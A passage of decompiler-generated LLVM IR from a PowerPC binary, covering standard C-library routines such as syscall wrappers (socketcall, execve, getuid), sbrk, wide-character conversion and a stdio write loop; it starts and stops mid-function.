  %v1_1000df30 = load i1, i1* @cr0_so, align 1
  %v2_1000df30 = xor i1 %v1_1000df30, true
  call void @__pseudo_cond_branch(i1 %v2_1000df30, i32 %v0_1000df30)
  %v0_1000df34 = call i32 @__syscall_error()
  ret i32 %v0_1000df34
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000df50 = call i32 @__asm_mfcr()
  %v1_1000df54 = and i32 %v0_1000df50, 268435456
  %v3_1000df54 = icmp eq i32 %v1_1000df54, 0
  store i32 %v0_1000df50, i32* %r31.global-to-local, align 4
  br i1 %v3_1000df54, label %dec_label_pc_1000df6c, label %dec_label_pc_1000df60

dec_label_pc_1000df60:                            ; preds = %entry
  %v0_1000df60 = call i32 @__errno_location()
  %v0_1000df64 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000df64 = inttoptr i32 %v0_1000df60 to i32*
  store i32 %v0_1000df64, i32* %v2_1000df64, align 4
  br label %dec_label_pc_1000df6c

dec_label_pc_1000df6c:                            ; preds = %entry, %dec_label_pc_1000df60
  %v0_1000df7c = phi i32 [ %v0_1000df50, %entry ], [ -1, %dec_label_pc_1000df60 ]
  ret i32 %v0_1000df7c

; uselistorder directives
  uselistorder label %dec_label_pc_1000df6c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000df98 = call i32 @__asm_mfcr()
  %v1_1000df9c = and i32 %v0_1000df98, 268435456
  store i32 %v1_1000df9c, i32* @r9, align 4
  %v3_1000df9c = icmp eq i32 %v1_1000df9c, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000df98, i32* %r31.global-to-local, align 4
  br i1 %v3_1000df9c, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000dfa8

dec_label_pc_1000dfa8:                            ; preds = %entry
  %v0_1000dfa8 = call i32 @__errno_location()
  %v0_1000dfac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dfac = inttoptr i32 %v0_1000dfa8 to i32*
  store i32 %v0_1000dfac, i32* %v2_1000dfac, align 4
  br label %dec_label_pc_1000dfb4

dec_label_pc_1000dfb4:                            ; preds = %entry, %dec_label_pc_1000dfa8
  %v0_1000dfc4 = phi i32 [ %v0_1000df98, %entry ], [ -1, %dec_label_pc_1000dfa8 ]
  ret i32 %v0_1000dfc4

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000dfb4, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dfe0 = call i32 @__asm_mfcr()
  %v1_1000dfe4 = and i32 %v0_1000dfe0, 268435456
  %v3_1000dfe4 = icmp eq i32 %v1_1000dfe4, 0
  store i32 %v0_1000dfe0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dfe4, label %dec_label_pc_1000dffc, label %dec_label_pc_1000dff0

dec_label_pc_1000dff0:                            ; preds = %entry
  %v0_1000dff0 = call i32 @__errno_location()
  %v0_1000dff4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dff4 = inttoptr i32 %v0_1000dff0 to i32*
  store i32 %v0_1000dff4, i32* %v2_1000dff4, align 4
  br label %dec_label_pc_1000dffc

dec_label_pc_1000dffc:                            ; preds = %entry, %dec_label_pc_1000dff0
  %v0_1000e00c = phi i32 [ %v0_1000dfe0, %entry ], [ -1, %dec_label_pc_1000dff0 ]
  ret i32 %v0_1000e00c

; uselistorder directives
  uselistorder label %dec_label_pc_1000dffc, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e028 = call i32 @__asm_mfcr()
  %v1_1000e02c = and i32 %v0_1000e028, 268435456
  %v3_1000e02c = icmp eq i32 %v1_1000e02c, 0
  store i32 %v0_1000e028, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e02c, label %dec_label_pc_1000e044, label %dec_label_pc_1000e038

dec_label_pc_1000e038:                            ; preds = %entry
  %v0_1000e038 = call i32 @__errno_location()
  %v0_1000e03c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e03c = inttoptr i32 %v0_1000e038 to i32*
  store i32 %v0_1000e03c, i32* %v2_1000e03c, align 4
  br label %dec_label_pc_1000e044

dec_label_pc_1000e044:                            ; preds = %entry, %dec_label_pc_1000e038
  %v0_1000e054 = phi i32 [ %v0_1000e028, %entry ], [ -1, %dec_label_pc_1000e038 ]
  ret i32 %v0_1000e054

; uselistorder directives
  uselistorder label %dec_label_pc_1000e044, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e070 = call i32 @__asm_mfcr()
  %v1_1000e074 = and i32 %v0_1000e070, 268435456
  %v3_1000e074 = icmp eq i32 %v1_1000e074, 0
  store i32 %v0_1000e070, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e074, label %dec_label_pc_1000e08c, label %dec_label_pc_1000e080

dec_label_pc_1000e080:                            ; preds = %entry
  %v0_1000e080 = call i32 @__errno_location()
  %v0_1000e084 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e084 = inttoptr i32 %v0_1000e080 to i32*
  store i32 %v0_1000e084, i32* %v2_1000e084, align 4
  br label %dec_label_pc_1000e08c

dec_label_pc_1000e08c:                            ; preds = %entry, %dec_label_pc_1000e080
  %v0_1000e09c = phi i32 [ %v0_1000e070, %entry ], [ -1, %dec_label_pc_1000e080 ]
  ret i32 %v0_1000e09c

; uselistorder directives
  uselistorder label %dec_label_pc_1000e08c, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e0b8 = call i32 @__asm_mfcr()
  %v1_1000e0bc = and i32 %v0_1000e0b8, 268435456
  %v3_1000e0bc = icmp eq i32 %v1_1000e0bc, 0
  store i32 %v0_1000e0b8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e0bc, label %dec_label_pc_1000e0d4, label %dec_label_pc_1000e0c8

dec_label_pc_1000e0c8:                            ; preds = %entry
  %v0_1000e0c8 = call i32 @__errno_location()
  %v0_1000e0cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e0cc = inttoptr i32 %v0_1000e0c8 to i32*
  store i32 %v0_1000e0cc, i32* %v2_1000e0cc, align 4
  br label %dec_label_pc_1000e0d4

dec_label_pc_1000e0d4:                            ; preds = %entry, %dec_label_pc_1000e0c8
  %v0_1000e0e4 = phi i32 [ %v0_1000e0b8, %entry ], [ -1, %dec_label_pc_1000e0c8 ]
  ret i32 %v0_1000e0e4

; uselistorder directives
  uselistorder i32 268435456, { 31, 32, 33, 1, 30, 29, 0, 23, 36, 16, 19, 38, 39, 13, 20, 34, 9, 11, 12, 8, 10, 22, 24, 14, 2, 41, 35, 7, 3, 4, 6, 26, 40, 27, 15, 17, 25, 44, 18, 5, 21, 28, 37, 42, 43, 45 }
  uselistorder label %dec_label_pc_1000e0d4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000e104 = load i32, i32* @global_var_1002c3e8.377, align 4
  %v3_1000e108 = icmp eq i32 %v3_1000e104, 0
  br i1 %v3_1000e108, label %dec_label_pc_1000e110, label %dec_label_pc_1000e11c

dec_label_pc_1000e110:                            ; preds = %entry
  store i32 268493076, i32* @lr, align 4
  %v1_1000e110 = call i32 @__GI_brk(i32 0)
  %v1_1000e114 = icmp slt i32 %v1_1000e110, 0
  br i1 %v1_1000e114, label %dec_label_pc_1000e13c, label %dec_label_pc_1000e110.dec_label_pc_1000e11c_crit_edge

dec_label_pc_1000e110.dec_label_pc_1000e11c_crit_edge: ; preds = %dec_label_pc_1000e110
  %v0_1000e11c.pre = load i32, i32* @r30, align 4
  %v3_1000e120.pre = load i32, i32* @global_var_1002c3e8.377, align 4
  br label %dec_label_pc_1000e11c

dec_label_pc_1000e11c:                            ; preds = %dec_label_pc_1000e110.dec_label_pc_1000e11c_crit_edge, %entry
  %v3_1000e120 = phi i32 [ %v3_1000e120.pre, %dec_label_pc_1000e110.dec_label_pc_1000e11c_crit_edge ], [ %v3_1000e104, %entry ]
  %v1_1000e128 = phi i32 [ %v0_1000e11c.pre, %dec_label_pc_1000e110.dec_label_pc_1000e11c_crit_edge ], [ %arg1, %entry ]
  %v3_1000e11c = icmp eq i32 %v1_1000e128, 0
  store i32 %v3_1000e120, i32* @r31, align 4
  br i1 %v3_1000e11c, label %dec_label_pc_1000e140, label %dec_label_pc_1000e130

dec_label_pc_1000e130:                            ; preds = %dec_label_pc_1000e11c
  %v2_1000e128 = add i32 %v1_1000e128, %v3_1000e120
  store i32 268493108, i32* @lr, align 4
  %v1_1000e130 = call i32 @__GI_brk(i32 %v2_1000e128)
  %tmp6 = icmp sgt i32 %v1_1000e130, -1
  br i1 %tmp6, label %dec_label_pc_1000e130.dec_label_pc_1000e140_crit_edge, label %dec_label_pc_1000e13c

dec_label_pc_1000e130.dec_label_pc_1000e140_crit_edge: ; preds = %dec_label_pc_1000e130
  %v0_1000e144.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e140

dec_label_pc_1000e13c:                            ; preds = %dec_label_pc_1000e130, %dec_label_pc_1000e110
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000e140

dec_label_pc_1000e140:                            ; preds = %dec_label_pc_1000e130.dec_label_pc_1000e140_crit_edge, %dec_label_pc_1000e11c, %dec_label_pc_1000e13c
  %v0_1000e144 = phi i32 [ %v0_1000e144.pre, %dec_label_pc_1000e130.dec_label_pc_1000e140_crit_edge ], [ %v3_1000e120, %dec_label_pc_1000e11c ], [ -1, %dec_label_pc_1000e13c ]
  ret i32 %v0_1000e144

; uselistorder directives
  uselistorder i32 %v3_1000e120, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000e140, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002c37c.134 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1002c37c.134, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000e164 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000e180 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000e180, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000e164, label %dec_label_pc_1000e18c, label %dec_label_pc_1000e194

dec_label_pc_1000e18c:                            ; preds = %entry
  %v2_1000e18c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000e18c, i32* @r3, align 4
  br label %dec_label_pc_1000e194

dec_label_pc_1000e194:                            ; preds = %entry, %dec_label_pc_1000e18c
  %v0_1000e198 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000e18c ]
  %v2_1000e194 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000e198, i32* %stack_var_-40, align 4
  store i32 %v2_1000e194, i32* %stack_var_-36, align 4
  store i32 268493220, i32* @lr, align 4
  %v0_1000e1a0 = call i32 @__GI_wcsnrtombs()
  %v3_1000e1a4 = icmp eq i32 %v0_1000e1a0, 0
  br i1 %v3_1000e1a4, label %dec_label_pc_1000e1ac, label %dec_label_pc_1000e1b0

dec_label_pc_1000e1ac:                            ; preds = %dec_label_pc_1000e194
  br label %dec_label_pc_1000e1b0

dec_label_pc_1000e1b0:                            ; preds = %dec_label_pc_1000e194, %dec_label_pc_1000e1ac
  %v0_1000e1bc = phi i32 [ %v0_1000e1a0, %dec_label_pc_1000e194 ], [ 1, %dec_label_pc_1000e1ac ]
  ret i32 %v0_1000e1bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000e1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e194, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000e1c0 = load i32, i32* @r6, align 4
  store i32 %v0_1000e1c0, i32* @r7, align 4
  %v0_1000e1c4 = load i32, i32* @r5, align 4
  store i32 %v0_1000e1c4, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000e1cc = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000e1cc

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000e1d0 = load i32, i32* @r3, align 4
  %v3_1000e1d0 = icmp eq i32 %v0_1000e1d0, 0
  %v0_1000e1d4 = load i32, i32* @lr, align 4
  store i32 %v0_1000e1d4, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e1d0, label %dec_label_pc_1000e1fc, label %dec_label_pc_1000e1e4

dec_label_pc_1000e1e4:                            ; preds = %entry
  %v1_1000e1e4 = load i32, i32* @r4, align 4
  %v4_1000e1e4 = icmp eq i32 %v0_1000e1d0, %v1_1000e1e4
  store i32 1, i32* @r10, align 4
  br i1 %v4_1000e1e4, label %dec_label_pc_1000e1f0, label %dec_label_pc_1000e228

dec_label_pc_1000e1f0:                            ; preds = %dec_label_pc_1000e1e4
  %v2_1000e1f4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000e1f4, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  br label %dec_label_pc_1000e228

dec_label_pc_1000e1fc:                            ; preds = %entry
  %v2_1000e1f411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000e1f411, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000e228

dec_label_pc_1000e208:                            ; preds = %dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge, %dec_label_pc_1000e248.preheader
  %v0_1000e208 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000e214 = inttoptr i32 %v0_1000e208 to i32*
  store i32 84, i32* %v2_1000e214, align 4
  %v0_1000e28c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e288

dec_label_pc_1000e21c:                            ; preds = %dec_label_pc_1000e258
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000e278.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000e274

dec_label_pc_1000e228:                            ; preds = %dec_label_pc_1000e1f0, %dec_label_pc_1000e1e4, %dec_label_pc_1000e1fc
  %v2_1000e2587 = phi i32 [ %v2_1000e1f4, %dec_label_pc_1000e1f0 ], [ %v0_1000e1d0, %dec_label_pc_1000e1e4 ], [ %v2_1000e1f411, %dec_label_pc_1000e1fc ]
  %v0_1000e228 = load i32, i32* @r5, align 4
  %v1_1000e228 = load i32, i32* @r6, align 4
  %v3_1000e228 = icmp ugt i32 %v0_1000e228, %v1_1000e228
  br i1 %v3_1000e228, label %dec_label_pc_1000e230, label %dec_label_pc_1000e234

dec_label_pc_1000e230:                            ; preds = %dec_label_pc_1000e228
  store i32 %v1_1000e228, i32* @r5, align 4
  br label %dec_label_pc_1000e234

dec_label_pc_1000e234:                            ; preds = %dec_label_pc_1000e228, %dec_label_pc_1000e230
  %v0_1000e240 = phi i32 [ %v0_1000e228, %dec_label_pc_1000e228 ], [ %v1_1000e228, %dec_label_pc_1000e230 ]
  %v1_1000e234 = add i32 %v0_1000e240, 1
  store i32 %v1_1000e234, i32* %r0.global-to-local, align 4
  %v0_1000e238 = load i32, i32* @r4, align 4
  %v1_1000e238 = inttoptr i32 %v0_1000e238 to i32*
  %v2_1000e238 = load i32, i32* %v1_1000e238, align 4
  store i32 %v2_1000e238, i32* %r11.global-to-local, align 4
  store i32 %v0_1000e240, i32* %r9.global-to-local, align 4
  store i32 %v0_1000e240, i32* %ctr.global-to-local, align 4
  %v2_1000e2703 = icmp eq i32 %v0_1000e240, 0
  br i1 %v2_1000e2703, label %dec_label_pc_1000e274, label %dec_label_pc_1000e248.preheader

dec_label_pc_1000e248.preheader:                  ; preds = %dec_label_pc_1000e234
  %v1_1000e24816 = inttoptr i32 %v2_1000e238 to i32*
  %v2_1000e24817 = load i32, i32* %v1_1000e24816, align 4
  store i32 %v2_1000e24817, i32* %r0.global-to-local, align 4
  %v1_1000e24c18 = add i32 %v2_1000e238, 4
  store i32 %v1_1000e24c18, i32* %r11.global-to-local, align 4
  %v2_1000e25020 = icmp ugt i32 %v2_1000e24817, 127
  br i1 %v2_1000e25020, label %dec_label_pc_1000e208, label %dec_label_pc_1000e258.lr.ph

dec_label_pc_1000e258.lr.ph:                      ; preds = %dec_label_pc_1000e248.preheader
  %extract.t = trunc i32 %v2_1000e24817 to i8
  br label %dec_label_pc_1000e258

dec_label_pc_1000e258:                            ; preds = %dec_label_pc_1000e258.lr.ph, %dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge
  %v2_1000e24823.off0 = phi i8 [ %extract.t, %dec_label_pc_1000e258.lr.ph ], [ %extract.t24, %dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge ]
  %v2_1000e25822 = phi i32 [ %v2_1000e2587, %dec_label_pc_1000e258.lr.ph ], [ %v2_1000e268, %dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge ]
  %v3_1000e258 = inttoptr i32 %v2_1000e25822 to i8*
  store i8 %v2_1000e24823.off0, i8* %v3_1000e258, align 1
  %v0_1000e25c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e25c = urem i32 %v0_1000e25c, 256
  store i32 %v1_1000e25c, i32* %r0.global-to-local, align 4
  %v3_1000e260 = icmp eq i32 %v1_1000e25c, 0
  br i1 %v3_1000e260, label %dec_label_pc_1000e21c, label %dec_label_pc_1000e268

dec_label_pc_1000e268:                            ; preds = %dec_label_pc_1000e258
  %v0_1000e268 = load i32, i32* @r3, align 4
  %v1_1000e268 = load i32, i32* @r10, align 4
  %v2_1000e268 = add i32 %v1_1000e268, %v0_1000e268
  store i32 %v2_1000e268, i32* @r3, align 4
  %v0_1000e26c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e26c = add i32 %v0_1000e26c, -1
  store i32 %v1_1000e26c, i32* %r9.global-to-local, align 4
  %v0_1000e270 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e270 = add i32 %v0_1000e270, -1
  store i32 %v1_1000e270, i32* %ctr.global-to-local, align 4
  %v2_1000e270 = icmp eq i32 %v1_1000e270, 0
  br i1 %v2_1000e270, label %dec_label_pc_1000e274, label %dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge

dec_label_pc_1000e268.dec_label_pc_1000e248_crit_edge: ; preds = %dec_label_pc_1000e268
  %v0_1000e248.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e248 = inttoptr i32 %v0_1000e248.pre to i32*
  %v2_1000e248 = load i32, i32* %v1_1000e248, align 4
  store i32 %v2_1000e248, i32* %r0.global-to-local, align 4
  %v1_1000e24c = add i32 %v0_1000e248.pre, 4
  store i32 %v1_1000e24c, i32* %r11.global-to-local, align 4
  %v2_1000e250 = icmp ugt i32 %v2_1000e248, 127
  %extract.t24 = trunc i32 %v2_1000e248 to i8
  br i1 %v2_1000e250, label %dec_label_pc_1000e208, label %dec_label_pc_1000e258

dec_label_pc_1000e274:                            ; preds = %dec_label_pc_1000e268, %dec_label_pc_1000e234, %dec_label_pc_1000e21c
  %v0_1000e278 = phi i32 [ %v0_1000e278.pre, %dec_label_pc_1000e21c ], [ %v2_1000e2587, %dec_label_pc_1000e234 ], [ %v2_1000e268, %dec_label_pc_1000e268 ]
  %v2_1000e274 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000e274, i32* %r0.global-to-local, align 4
  %v4_1000e278 = icmp eq i32 %v0_1000e278, %v2_1000e274
  br i1 %v4_1000e278, label %dec_label_pc_1000e284, label %dec_label_pc_1000e280

dec_label_pc_1000e280:                            ; preds = %dec_label_pc_1000e274
  %v0_1000e280 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e280 = load i32, i32* @r4, align 4
  %v2_1000e280 = inttoptr i32 %v1_1000e280 to i32*
  store i32 %v0_1000e280, i32* %v2_1000e280, align 4
  br label %dec_label_pc_1000e284

dec_label_pc_1000e284:                            ; preds = %dec_label_pc_1000e274, %dec_label_pc_1000e280
  %v0_1000e284 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e284 = load i32, i32* @r5, align 4
  %v2_1000e284 = sub i32 %v1_1000e284, %v0_1000e284
  store i32 %v2_1000e284, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e288

dec_label_pc_1000e288:                            ; preds = %dec_label_pc_1000e208, %dec_label_pc_1000e284
  %v0_1000e28c = phi i32 [ %v0_1000e28c.pre, %dec_label_pc_1000e208 ], [ %v2_1000e284, %dec_label_pc_1000e284 ]
  store i32 %v0_1000e1d4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e28c

; uselistorder directives
  uselistorder i32 %v1_1000e270, { 1, 0 }
  uselistorder i32 %v2_1000e268, { 0, 2, 1 }
  uselistorder i32 %v1_1000e25c, { 1, 0 }
  uselistorder i32 %v0_1000e240, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000e2587, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 4, 5, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 7, 8, 5, 3, 6 }
  uselistorder label %dec_label_pc_1000e288, { 1, 0 }
  uselistorder label %dec_label_pc_1000e284, { 1, 0 }
  uselistorder label %dec_label_pc_1000e258, { 1, 0 }
  uselistorder label %dec_label_pc_1000e234, { 1, 0 }
  uselistorder label %dec_label_pc_1000e228, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000e29c = load i32, i32* @lr, align 4
  store i32 %v0_1000e29c, i32* %r0.global-to-local, align 4
  %v0_1000e2a8 = load i32, i32* @r5, align 4
  store i32 %v0_1000e2a8, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000e2a8, i32* @r31, align 4
  %v3_1000e2bc3 = icmp eq i32 %v0_1000e2a8, 0
  store i32 %v0_1000e2a8, i32* @r27, align 4
  br i1 %v3_1000e2bc3, label %dec_label_pc_1000e364, label %dec_label_pc_1000e2cc

dec_label_pc_1000e2cc:                            ; preds = %entry, %dec_label_pc_1000e2ec
  %v0_1000e2dc = phi i32 [ %v2_1000e2ec, %dec_label_pc_1000e2ec ], [ %arg2, %entry ]
  %v1_1000e2cc.in = phi i32 [ %v2_1000e2f0, %dec_label_pc_1000e2ec ], [ %v0_1000e2a8, %entry ]
  %v1_1000e2cc = icmp sgt i32 %v1_1000e2cc.in, 0
  br i1 %v1_1000e2cc, label %dec_label_pc_1000e2d8, label %dec_label_pc_1000e2d0

dec_label_pc_1000e2d0:                            ; preds = %dec_label_pc_1000e2cc
  br label %dec_label_pc_1000e2d8

dec_label_pc_1000e2d8:                            ; preds = %dec_label_pc_1000e2cc, %dec_label_pc_1000e2d0
  %v0_1000e2d8 = load i32, i32* @r30, align 4
  %v1_1000e2d8 = add i32 %v0_1000e2d8, 4
  %v2_1000e2d8 = inttoptr i32 %v1_1000e2d8 to i32*
  %v3_1000e2d8 = load i32, i32* %v2_1000e2d8, align 4
  store i32 268493540, i32* @lr, align 4
  %v3_1000e2e0 = call i32 @__libc_write(i32 %v3_1000e2d8, i32 %v0_1000e2dc)
  %v1_1000e2e4 = icmp slt i32 %v3_1000e2e0, 0
  br i1 %v1_1000e2e4, label %dec_label_pc_1000e2f8, label %dec_label_pc_1000e2ec

dec_label_pc_1000e2ec:                            ; preds = %dec_label_pc_1000e2d8
  %v0_1000e2ec = load i32, i32* @r29, align 4
  %v2_1000e2ec = add i32 %v0_1000e2ec, %v3_1000e2e0
  store i32 %v2_1000e2ec, i32* @r29, align 4
  %v1_1000e2f0 = load i32, i32* @r31, align 4
  %v2_1000e2f0 = sub i32 %v1_1000e2f0, %v3_1000e2e0
  store i32 %v2_1000e2f0, i32* @r31, align 4
  %v3_1000e2bc = icmp eq i32 %v2_1000e2f0, 0
  store i32 %v2_1000e2f0, i32* @r27, align 4
  br i1 %v3_1000e2bc, label %dec_label_pc_1000e2bc.dec_label_pc_1000e364.loopexit_crit_edge, label %dec_label_pc_1000e2cc

dec_label_pc_1000e2f8:                            ; preds = %dec_label_pc_1000e2d8
  %v0_1000e2f8 = load i32, i32* @r30, align 4
  %v1_1000e2f8 = add i32 %v0_1000e2f8, 8
  %v2_1000e2f8 = inttoptr i32 %v1_1000e2f8 to i32*
  %v3_1000e2f8 = load i32, i32* %v2_1000e2f8, align 4
  store i32 %v3_1000e2f8, i32* %r11.global-to-local, align 4
  %v1_1000e2fc = add i32 %v0_1000e2f8, 12
  %v2_1000e2fc = inttoptr i32 %v1_1000e2fc to i32*
  %v3_1000e2fc = load i32, i32* %v2_1000e2fc, align 4
  store i32 %v3_1000e2fc, i32* %r0.global-to-local, align 4
  %v1_1000e300 = inttoptr i32 %v0_1000e2f8 to i16*
  %v2_1000e300 = load i16, i16* %v1_1000e300, align 2
  %v2_1000e304 = sub i32 %v3_1000e2fc, %v3_1000e2f8
  store i32 %v2_1000e304, i32* %r0.global-to-local, align 4
  %v5_1000e304 = icmp eq i32 %v2_1000e304, 0
  %v1_1000e308 = or i16 %v2_1000e300, 8
  store i16 %v1_1000e308, i16* %v1_1000e300, align 2
  br i1 %v5_1000e304, label %dec_label_pc_1000e2f8.dec_label_pc_1000e360_crit_edge, label %dec_label_pc_1000e314

dec_label_pc_1000e2f8.dec_label_pc_1000e360_crit_edge: ; preds = %dec_label_pc_1000e2f8
  %v0_1000e360.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e360

dec_label_pc_1000e314:                            ; preds = %dec_label_pc_1000e2f8
  %v0_1000e314 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e314 = load i32, i32* @r31, align 4
  %v3_1000e314 = icmp ugt i32 %v0_1000e314, %v1_1000e314
  br i1 %v3_1000e314, label %dec_label_pc_1000e314.dec_label_pc_1000e320_crit_edge, label %dec_label_pc_1000e31c

dec_label_pc_1000e314.dec_label_pc_1000e320_crit_edge: ; preds = %dec_label_pc_1000e314
  %v0_1000e320.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000e320

dec_label_pc_1000e31c:                            ; preds = %dec_label_pc_1000e314
  store i32 %v0_1000e314, i32* @r27, align 4
  br label %dec_label_pc_1000e320

dec_label_pc_1000e320:                            ; preds = %dec_label_pc_1000e314.dec_label_pc_1000e320_crit_edge, %dec_label_pc_1000e31c
  %v0_1000e320 = phi i32 [ %v0_1000e320.pre, %dec_label_pc_1000e314.dec_label_pc_1000e320_crit_edge ], [ %v0_1000e314, %dec_label_pc_1000e31c ]
  store i32 %v0_1000e320, i32* %ctr.global-to-local, align 4
  %v2_1000e32c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e324

dec_label_pc_1000e324:                            ; preds = %dec_label_pc_1000e348, %dec_label_pc_1000e320
  %v2_1000e32c = phi i32 [ %v1_1000e348, %dec_label_pc_1000e348 ], [ %v2_1000e32c.pre, %dec_label_pc_1000e320 ]
  %v0_1000e324 = load i32, i32* @r29, align 4
  %v1_1000e324 = inttoptr i32 %v0_1000e324 to i8*
  %v2_1000e324 = load i8, i8* %v1_1000e324, align 1
  %v3_1000e324 = zext i8 %v2_1000e324 to i32
  store i32 %v3_1000e324, i32* %r0.global-to-local, align 4
  %v1_1000e328 = add i32 %v0_1000e324, 1
  store i32 %v1_1000e328, i32* @r29, align 4
  %v3_1000e32c = inttoptr i32 %v2_1000e32c to i8*
  store i8 %v2_1000e324, i8* %v3_1000e32c, align 1
  %v0_1000e330 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e330 = urem i32 %v0_1000e330, 256
  store i32 %v1_1000e330, i32* %r0.global-to-local, align 4
  %v3_1000e334 = icmp eq i32 %v1_1000e330, 10
  br i1 %v3_1000e334, label %dec_label_pc_1000e33c, label %dec_label_pc_1000e348

dec_label_pc_1000e33c:                            ; preds = %dec_label_pc_1000e324
  %v0_1000e33c = load i32, i32* @r30, align 4
  %v1_1000e33c = inttoptr i32 %v0_1000e33c to i16*
  %v2_1000e33c = load i16, i16* %v1_1000e33c, align 2
  %v3_1000e33c = zext i16 %v2_1000e33c to i32
  store i32 %v3_1000e33c, i32* %r0.global-to-local, align 4
  %v1_1000e340 = and i32 %v3_1000e33c, 256
